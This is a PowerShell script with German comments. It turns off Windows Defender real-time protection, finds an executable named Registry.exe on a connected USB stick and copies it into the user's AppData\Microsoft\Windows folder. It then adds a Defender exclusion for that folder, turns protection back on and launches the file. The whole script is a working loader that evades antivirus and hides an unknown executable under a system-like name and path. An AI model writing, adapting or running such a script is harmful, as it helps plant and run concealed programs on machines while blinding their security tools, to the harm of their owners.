# Sicherstellen, dass das Skript mit Admin-Rechten läuft
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Bitte führe das Skript als Administrator aus!"
    exit
}

# 1. Windows Defender temporär deaktivieren
Write-Host "Deaktiviere Windows Defender (Echtzeitschutz)..."
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. Alle aktuell verbundenen USB-Sticks auslesen
Write-Host "Suche nach angeschlossenen USB-Sticks..."

# USB-Laufwerke (Massenspeicher) ermitteln
$usbDrives = Get-WmiObject -Query "SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'"

if (-not $usbDrives) {
    Write-Warning "Keine USB-Sticks gefunden."
    # Defender wieder aktivieren und Skript beenden
    Set-MpPreference -DisableRealtimeMonitoring $false
    exit
}

# 3. Für jeden USB-Stick prüfen, ob Registry.exe vorhanden ist
$foundFilePath = $null

foreach ($drive in $usbDrives) {
    # Pfad des Volumes (Laufwerksbuchstaben ermitteln)
    $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"
    foreach ($partition in $partitions) {
        $logicalDisks = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass = Win32_LogicalDiskToPartition"
        foreach ($logicalDisk in $logicalDisks) {
            $driveLetter = $logicalDisk.DeviceID + "\"
            $filePath = Join-Path $driveLetter "Registry.exe"

            if (Test-Path $filePath) {
                Write-Host "Datei Registry.exe gefunden auf Laufwerk $driveLetter"
                $foundFilePath = $filePath
                break
            }
        }
        if ($foundFilePath) { break }
    }
    if ($foundFilePath) { break }
}

if (-not $foundFilePath) {
    Write-Warning "Registry.exe wurde auf keinem USB-Stick gefunden."
    # Defender wieder aktivieren und Skript beenden
    Set-MpPreference -DisableRealtimeMonitoring $false
    exit
}

# 4. Zielordner dynamisch bestimmen (aktueller Benutzer)
$zielOrdner = Join-Path $env:APPDATA "Microsoft\Windows"
if (-not (Test-Path $zielOrdner)) {
    Write-Host "Zielordner $zielOrdner existiert nicht, wird erstellt..."
    New-Item -Path $zielOrdner -ItemType Directory -Force
}

# 5. Datei kopieren
$zielDatei = Join-Path $zielOrdner "Registry.exe"
Write-Host "Kopiere Registry.exe nach $zielOrdner"
Copy-Item -Path $foundFilePath -Destination $zielDatei -Force

# 6. Defender-Ausnahme für Zielordner hinzufügen
Write-Host "Füge Defender-Ausnahme für $zielOrdner hinzu"
Add-MpPreference -ExclusionPath $zielOrdner

# 7. Defender wieder aktivieren
Write-Host "Aktiviere Windows Defender wieder..."
Set-MpPreference -DisableRealtimeMonitoring $false

# 8. Datei ausführen (ebenfalls dynamisch aus dem AppData-Pfad)
$ausfuehrPfad = Join-Path $env:APPDATA "Microsoft\Windows\Registry.exe"
if (Test-Path $ausfuehrPfad) {
    Write-Host "Starte Datei $ausfuehrPfad"
    Start-Process -FilePath $ausfuehrPfad
} else {
    Write-Warning "Datei zum Ausführen nicht gefunden: $ausfuehrPfad"
}
